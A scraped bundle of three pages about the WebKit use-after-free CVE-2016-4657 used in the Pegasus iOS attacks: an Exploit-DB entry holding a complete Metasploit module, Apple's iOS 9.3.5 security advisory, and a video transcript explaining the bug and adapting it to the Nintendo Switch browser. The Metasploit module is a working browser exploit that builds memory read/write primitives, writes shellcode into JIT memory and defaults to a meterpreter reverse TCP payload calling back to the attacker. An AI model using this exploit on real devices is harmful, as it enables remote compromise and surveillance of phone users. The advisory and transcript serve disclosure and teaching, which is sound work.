=== Content from www.exploit-db.com_b91e9437_20250125_172727.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# WebKit - not\_number defineProperties UAF (Metasploit)

#### EDB-ID:

###### 44836

#### CVE:

###### [2016-4657](https://nvd.nist.gov/vuln/detail/CVE-2016-4657) [2016-4656](https://nvd.nist.gov/vuln/detail/CVE-2016-4656) [2016-4655](https://nvd.nist.gov/vuln/detail/CVE-2016-4655)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [iOS](/?platform=ios)

#### Date:

###### 2018-06-05

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WebKit not_number defineProperties UAF',
      'Description'    => %q{
          This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'qwertyoruiop', # jbme.qwertyoruiop.com
        'siguza',       # PhoenixNonce
        'tihmstar',     # PhoenixNonce
        'timwr',        # metasploit integration
        ],
      'References'     => [
          ['CVE', '2016-4655'],
          ['CVE', '2016-4656'],
          ['CVE', '2016-4657'],
          ['BID', '92651'],
          ['BID', '92652'],
          ['BID', '92653'],
          ['URL', 'https://blog.lookout.com/trident-pegasus'],
          ['URL', 'https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/'],
          ['URL', 'https://www.blackhat.com/docs/eu-16/materials/eu-16-Bazaliy-Mobile-Espionage-in-the-Wild-Pegasus-and-Nation-State-Level-Attacks.pdf'],
          ['URL', 'https://github.com/Siguza/PhoenixNonce'],
          ['URL', 'https://jndok.github.io/2016/10/04/pegasus-writeup/'],
          ['URL', 'https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html'],
        ],
      'Arch'           => ARCH_AARCH64,
      'Platform'       => 'apple_ios',
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/aarch64/meterpreter_reverse_tcp' },
      'Targets'        => [[ 'Automatic', {} ]],
      'DisclosureDate' => 'Aug 25 2016'))
    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 8080 ]),
        OptString.new('URIPATH', [ true, "The URI to use for this exploit.", "/" ])
      ])
  end

  def on_request_uri(cli, request)
    print_status("Request from #{request['User-Agent']}")
    if request.uri =~ %r{/loader$}
      print_good("Target is vulnerable.")
      local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-4655", "loader" )
      loader_data = File.read(local_file, {:mode => 'rb'})
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      return
    elsif request.uri =~ %r{/exploit$}
      local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-4655", "exploit" )
      loader_data = File.read(local_file, {:mode => 'rb'})
      payload_url = "tcp://#{datastore["LHOST"]}:#{datastore["LPORT"]}"
      payload_url_index = loader_data.index('PAYLOAD_URL')
      loader_data[payload_url_index, payload_url.length] = payload_url
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      print_status("Sent exploit (#{loader_data.size} bytes)")
      return
    end
    html = %Q^
<html>
<body>
<script>
 function load_binary_resource(url) {
   var req = new XMLHttpRequest();
   req.open('GET', url, false);
   req.overrideMimeType('text/plain; charset=x-user-defined');
   req.send(null);
   return req.responseText;
 }
 var mem0 = 0;
 var mem1 = 0;
 var mem2 = 0;

 function read4(addr) {
  mem0[4] = addr;
  var ret = mem2[0];
  mem0[4] = mem1;
  return ret;
 }

 function write4(addr, val) {
  mem0[4] = addr;
  mem2[0] = val;
  mem0[4] = mem1;
 }
 filestream = load_binary_resource("exploit")
 var shll = new Uint32Array(filestream.length / 4);
 for (var i = 0; i < filestream.length;) {
  var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
  shll[i / 4] = word;
  i += 4;
 }
 _dview = null;
 function u2d(low, hi) {
  if (!_dview) _dview = new DataView(new ArrayBuffer(16));
  _dview.setUint32(0, hi);
  _dview.setUint32(4, low);
  return _dview.getFloat64(0);
 }
 var pressure = new Array(100);
 var bufs = new Array(10000);
 dgc = function() {
  for (var i = 0; i < pressure.length; i++) {
   pressure[i] = new Uint32Array(0x10000);
  }
  for (var i = 0; i < pressure.length; i++) {
   pressure[i] = 0;
  }
 }

 function swag() {
  if (bufs[0]) return;
  for (var i = 0; i < 4; i++) {
    dgc();
  }
  for (i = 0; i < bufs.length; i++) {
   bufs[i] = new Uint32Array(0x100 * 2)
   for (k = 0; k < bufs[i].length;) {
    bufs[i][k++] = 0x41414141;
    bufs[i][k++] = 0xffff0000;
   }
  }
 }
 var trycatch = "";
 for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
 var fc = new Function(trycatch);
 var fcp = 0;
 var smsh = new Uint32Array(0x10)

 function smashed(stl) {
  document.body.innerHTML = "";
  var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
  write4(jitf, 0xd28024d0);         //movz x16, 0x126
  write4(jitf + 4, 0x58000060);     //ldr x0, 0x100007ee4
  write4(jitf + 8, 0xd4001001);     //svc 80
  write4(jitf + 12, 0xd65f03c0);    //ret
  write4(jitf + 16, jitf + 0x20);
  write4(jitf + 20, 1);
  fc();
  var dyncache = read4(jitf + 0x20);
  var dyncachev = read4(jitf + 0x20);
  var go = 1;
  while (go) {
   if (read4(dyncache) == 0xfeedfacf) {
    for (i = 0; i < 0x1000 / 4; i++) {
     if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
     {
      go = 0;
      break;
     }
    }
   }
   dyncache += 0x1000;
  }
  dyncache -= 0x1000;
  var bss = [];
  var bss_size = [];
  for (i = 0; i < 0x1000 / 4; i++) {
   if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
    bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
    bss_size.push(read4(dyncache + i * 4 + (0x28)));
   }
  }
  var shc = jitf;
  var filestream = load_binary_resource("loader")
  for (var i = 0; i < filestream.length;) {
   var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
   write4(shc, word);
   shc += 4;
   i += 4;
  }
  jitf &= ~0x3FFF;
  jitf += 0x8000;
  write4(shc, jitf);
  write4(shc + 4, 1);
  // copy macho
  for (var i = 0; i < shll.length; i++) {
   write4(jitf + i * 4, shll[i]);
  }
  for (var i = 0; i < bss.length; i++) {
   for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
    write4(bss[i] + k * 4, 0);
   }
  }
  fc();
 }

 function go_() {
  if (smsh.length != 0x10) {
   smashed();
   return;
  }
  dgc();
  var arr = new Array(0x100);
  var yolo = new ArrayBuffer(0x1000);
  arr[0] = yolo;
  arr[1] = 0x13371337;
  var not_number = {};
  not_number.toString = function() {
   arr = null;
   props["stale"]["value"] = null;
   swag();
   return 10;
  };
  var props = {
   p0: {
    value: 0
   },
   p1: {
    value: 1
   },
   p2: {
    value: 2
   },
   p3: {
    value: 3
   },
   p4: {
    value: 4
   },
   p5: {
    value: 5
   },
   p6: {
    value: 6
   },
   p7: {
    value: 7
   },
   p8: {
    value: 8
   },
   length: {
    value: not_number
   },
   stale: {
    value: arr
   },
   after: {
    value: 666
   }
  };
  var target = [];
  var stale = 0;
  Object.defineProperties(target, props);
  stale = target.stale;
  stale[0] += 0x101;
  stale[1] = {}
  for (var z = 0; z < 0x1000; z++) fc();
  for (i = 0; i < bufs.length; i++) {
   for (k = 0; k < bufs[0].length; k++) {
    if (bufs[i][k] == 0x41414242) {
     stale[0] = fc;
     fcp = bufs[i][k];
     stale[0] = {
      'a': u2d(105, 0),
      'b': u2d(0, 0),
      'c': smsh,
      'd': u2d(0x100, 0)
     }
     stale[1] = stale[0]
     bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
     bck = stale[0][4];
     stale[0][4] = 0; // address, low 32 bits
     // stale[0][5] = 1; // address, high 32 bits == 0x100000000
     stale[0][6] = 0xffffffff;
     mem0 = stale[0];
     mem1 = bck;
     mem2 = smsh;
     bufs.push(stale)
     if (smsh.length != 0x10) {
      smashed(stale[0]);
     }
     return;
    }
   }
  }
  setTimeout(function() {
    document.location.reload();
  }, 2000);
 }

dgc();
setTimeout(go_, 200);
</script>
</body>
</html>
    ^
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://raw.githubusercontent.com/rapid7/metasploit-framework/61a98b94b62c8ae33148f8d9a21d07fd1bbe8745/modules/exploits/apple_ios/browser/webkit_trident.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from support.apple.com_6a1b071d_20250125_172725.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of iOS 9.3.5

This document describes the security content of iOS 9.3.5.

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://www.apple.com/support/security/) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## iOS 9.3.5

Released August 25, 2016

**Kernel**

Available for: iPhone 4s and later, iPad 2 and later, iPod touch (5th generation) and later

Impact: An application may be able to disclose kernel memory

Description: A validation issue was addressed through improved input sanitization.

CVE-2016-4655: Citizen Lab and Lookout

**Kernel**

Available for: iPhone 4s and later, iPad 2 and later, iPod touch (5th generation) and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-4656: Citizen Lab and Lookout

**WebKit**

Available for: iPhone 4s and later, iPad 2 and later, iPod touch (5th generation) and later

Impact: Visiting a maliciously crafted website may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-4657: Citizen Lab and Lookout

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of iOS 9.3.5

[United States](https://support.apple.com/en-us/103628/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from www.youtube.com_15c8693f_20250125_172728.html ===
[00:00] What does iOS 9.3 and the Nintendo Switch
have in common?
[00:05] They both use the browser engine WebKit with
a version that is vulnerable to a known memory
[00:10] corruption vulnerability.
[00:12] Remember the news of the pegasus malware for
iOS, which was discovered when it was used
[00:17] in a targeted attack against the human rights
activist Ahmed Mansoor?
[00:22] That malware used a webkit exploit as the
first stage, to gain arbitrary code execution.
[00:29] Qwerty and the pangu team then used this bug
in their jailbreakme website.
[00:32] And it turns out, the browser of the Nintendo
Switch is so old, that is also has this bug.
[00:39] And this is what a lot of people are using
right now as a first entry point in hacking
[00:43] the switch.
[00:45] Obviously the whole jailbreak is extremely
complex, even just getting code execution
[00:49] is insane.
[00:50] But I spent now quite some time understanding
the bug itself and the first crucial part
[00:56] which creates an arbitrary read/write primitive.
[00:59] So you can overwrite anything in memory, for
example function pointers or jitted code.
[01:03] But let’s start at the beginning.
[01:07]
First we need to figure out how to access
[01:13] the browser in the switch.
[01:15] You may have heard that the Nintendo Switch
doesn’t have a browser, so what the heck
[01:19] am I talking about?
[01:21] Well there is no good browser implemented,
but it turns out, that when you connect to
[01:26] a wifi, which requires you to login in a captive
portal, it will use a browser view and load
[01:32] that page for you.
[01:33] A captive portal is common in hotels and airports
and stuff.
[01:37] So we have to figure out how to load our own
website here.
[01:42] When you look at the network settings, you
can specify a proxy server, which is great
[01:46] because then I can run a proxy server on my
laptop and intercept all the traffic.
[01:50] I use Burp Suite as my proxy server and just
have to make sure it listens on all interfaces,
[01:56] so other devices on the same network can use
it.
[02:00] So now we just have to enter the IP of this
laptop into the proxy settings of the switch.
[02:06] When we now connect to the wifi, the switch
will establish connections through this laptop.
[02:11] And we can see here in the Burp history view,
that the switch tried to contact conntest.nintendowifi.net
[02:19] That site just responds with a simple string
that the connection works.
[02:23] It uses this to check if you have internet
connection or not.
[02:26] So, if this check fails, it will think you
first need to authenticate from a captive
[02:31] portal.
[02:32] So next we need to redirect this request to
a different page, basically our “captive
[02:37] portal”.
[02:38] We can do that by simply modifying the /etc/hosts
file, to point the conntest domain to another
[02:44] IP.
[02:45] For example localhost.
[02:46] Then we spawn a simple webserver on our machine,
for example with php -S.
[02:52] We can place a index.html file in here to
verify that this works.
[02:57] And with a browser we can see that we have
now on localhost a webserver running.
[03:02] So, when the switch now connects to the wifi,
it will try to contact conntest and it will
[03:08] go through the proxy on my laptop.
[03:10] My laptop sees in the /etc/hosts file what
the IP for conntest is.
[03:16] So the proxy will connect to localhost instead,
which will access our index.html file.
[03:21] Let’s try it.
[03:22] We search for the wifi.
[03:23] We connect to it.
[03:24] It will check if there is access to the internet.
[03:27] It didn’t get the expected result for conntest
back and tells you you have to login.
[03:33] When we now press next, it will load what
it thinks is the captive portal.
[03:37] Now we have access to a browser that loads
our website.
[03:40] We can also have a look at the requests in
burp, which shows us the User Agent the switch
[03:41] uses.
[03:42] So now that we have that setup, let’s read
up a bit more on the webkit bug.
[03:45] It was assigned CVE-2016-4657 and has the
description: “WebKit in Apple iOS before
[03:53] 9.3.5 allows remote attackers to execute arbitrary
code or cause a denial of service (memory
[03:59] corruption) via a crafted web site.”
[04:02] The description can be a bit misleading.
[04:04] Makes it sound like it’s only an iOS issue,
but its generally a webkit bug, and would
[04:09] affect anything that used that particular
webkit version.
[04:12] In our case the nintendo switch.
[04:16] Also this is not an exploit where you just
type into metasploit `use exploit/nintendoswitch/webkit`.
[04:22] This is something where you actually have
to understand it quite in depth to be able
[04:25] to use it.
[04:27] Now let’s take qwerty’s jailbreakme code,
which uses the webkit bug, extract the first
[04:32] relevant part and adapt it to the nintendo
switch.
[04:35] I won’t go through all this process because
that took me ages to understand, but I want
[04:40] to show and explain to you what I got now...
[04:43] So let’s walk through it.
[04:54] First we create a Typed Array of unisgned
32bit integers.
[04:57] And in memory this will create a struct with
a couple of different values such as a JSCell
[05:03] which contains a couple of interesting values
such as a structure ID that determines kind
[05:07] of the type of this object.
[05:09] We will look at that later again.
[05:11] A butterfly pointer, which is used in a bit
more complex objects but not quite relevant
[05:16] for us right now, a vector which contains
a pointer to a chunk of memory that represents
[05:22] our array.
[05:23] And the length of that memory.
[05:25] So that array gives us basically access to
raw bytes in memory.
[05:29] Obviously you can’t access beyond it’s
length.
[05:33] Then we create a more flexible array.
[05:35] A standard array like you might use it.
[05:38] That array is a bit different, as it can contain
arbitrary types.
[05:42] Any kind of objects.
[05:43] So instead of just pointing to raw memory,
it points to more complex objects called JSValues.
[05:49] And here is an example of the integer with
the hex value 41414141, it would store 0xffff0000
[05:56] before it, to indicate the value is an integer.
[06:02] Look at the amazing phrack paper if you want
to know more details about these JSValues.
[06:06] In the case of the exploit it will set the
first element of the Array to a big ArrayBuffer
[06:11] and the second to some number.
[06:12] An Array Buffer is also access to raw bytes.
[06:16] Basically different typed arrays can point
to the same buffer in memory.
[06:19] Whatever, read the javascript reference.
[06:20] So If I’m not mistaken, the first element
of the array is now a JSValue with a pointer
[06:26] to an array buffer.
[06:30] Next we create a simple Javascript Object
and overwrite its toString() function.
[06:35] That function is called whenever you want
to get a string representation of that object.
[06:41] So if I return 1337 object as a string, and
I would alert this object, it would call to
[06:48] string and show me that one.
[06:49] But in this case the function does a bit more.
[06:52] It first sets the reference to the array we
just created to null, as well as setting another
[06:57] property to null.
[06:58] In a second you will see that this “stale”
property is also a reference to the arr array.
[07:04] Theoretically now all references to the array
are gone, and the garbage collector can free
[07:10] that array.
[07:11] To force the garbage collector to kick in
right now, we can use the function which just
[07:16] allocates and removes a lot of objects.
[07:19] And when you do this a couple of times you
can be fairly certain that the garbage collector
[07:23] did the work.
[07:26] After the garbage collection the function
will now allocate a lot of new Uint32Arrays.
[07:32] The reference to those are stored in buf,
so we can access those arrays.
[07:38] And if everything goes well those arrays might
be allocated where the previous array was.
[07:44] But how is this object with that toString
function used now.
[07:50] We define an object that we use as properties.
[07:53] And I think we allocate more than just two,
so the properties are not stored inline, but
[07:58] I’m not 100% sure here.
[08:00] Anyway, one of these properties is called
stale, and it is set to the array reference.
[08:05] That is the property that the toString function
will set to null.
[08:10] Another property is `length` which is set
to the not\_number object.
[08:16] Then we create a new empty array target and
apply those properties to it with Object.defineProperties.
[08:24] This means all those properties we defined
will be set to the target array.
[08:28] During this assignment, the toString() function
of not\_number will be called and causes the
[08:34] garbage collection of the array.
[08:36] As well as the allocation of a lot of Uint32Arrays.
[08:40] And this is where the bug happens.
[08:43] Theoretically the stale property was set to
null, and should not be accessible.
[08:47] But somehow the reference is still there.
[08:50] Some stuff internally did not properly check
everything.
[08:53] This means that we have a reference into some
memory where previously the arr array was
[09:00] allocated.
[09:01] And we also allocated a lot of Uin32Arrays
and we hope that these now overlap.
[09:07] As I mentioned earlier, the Uint32Arrays allow
direct memory access, they can read and write
[09:12] raw bytes.
[09:13] While the arr array was a complex object,
with JSValues.
[09:17] Now it’s already clear what you can do with
this.
[09:20] You can use the Uint32Arrays, which are accessible
via buf.
[09:25] To read and write raw bytes at the location
where the stale property thinks a standard
[09:31] Javascript object is.
[09:33] So first it has to find if and how the buf
and the stale array overlap.
[09:39] To do this, we can simply add a number to
the first element of stale.
[09:44] But what is the first element of stale now.
[09:46] Isn’t that garbage memory?
[09:48] well ideally, if everything works, it points
to where we created the uInt32Arrays, and
[09:52] we populated that memory region with 0xffff000041414141,
which is a JSValue representing an integer.
[10:03] In fact the number 0x41414141.
[10:05] This means that now we add hex 101 to the
first element of the stale array, making it
[10:11] 0x41414242.
[10:15] We can then simply search through the whole
uInt32Array memory looking for this 0x41414242.
[10:23] Keep in mind that the buf has access to raw
bytes, so it will infact see the 0xffff0000
[10:28] and the 0x41414141, while the stale array
things this is a javascript object, and only
[10:35] uses the 0xffff0000 internally to determine,
that we have an integer and the value of it
[10:39] is 0x41414141.
[10:41] So what can we do with this now.
[10:43] This is where exploitation really become creative.
[10:46] The phrack article says that once you have
the ability to craft arbitrary javascript
[10:50] objects, you could craft a Float64Array to
create a read/write primitive, but qwerty
[10:56] used a Uint32Array.
[10:57] To quote him, here is his reason:
“Easier than float to do math with.
[11:03] Lol.”
[11:04] And I guess he has a point.
[11:05] Floating point values in raw bytes are really
annoying.
[11:07] So first of all, why do we want to craft a
Uint32Array.
[11:12] If you remember the basic structure of a Uint32Array,
it uses a vector to point to some raw memory.
[11:18] If you control where this pointer points to,
you can control where you can read data from
[11:23] and write data to it.
[11:25] Because it thinks it points to the actual
array.
[11:28] There is a super clever way how to craft this
array now.
[11:32] Qwerty creates a new object with four properties.
[11:35] A,b,c,d.
[11:36] He probably just took that from the phrack
article, because when you look at how a simple
[11:40] object with only four properties is stored,
it stores the values inline.
[11:45] This is very helpful in a second.
[11:47] As you see, the values set, like the hex 1337
are simply placed here in memory after eachother.
[11:54] So that’s a very neat way to control a couple
of consecutive values in memory.
[11:59] The two 64bit values are the JSCell and the
butterfly pointer.
[12:04] The JSCell, or more specifically the structure
ID inside of the JSCell determines, what this
[12:10] Javscript Object actually is.
[12:12] In the phrack article it looks like, this
object here has the ID 136.
[12:17] So in order to craft a Uint32Array, we would
have to know the structure ID of that.
[12:23] According to the phrack article, this ID can
change sometimes, maybe at restart or between
[12:28] different webkit builds.
[12:30] But apparently it’s very common to be 105.
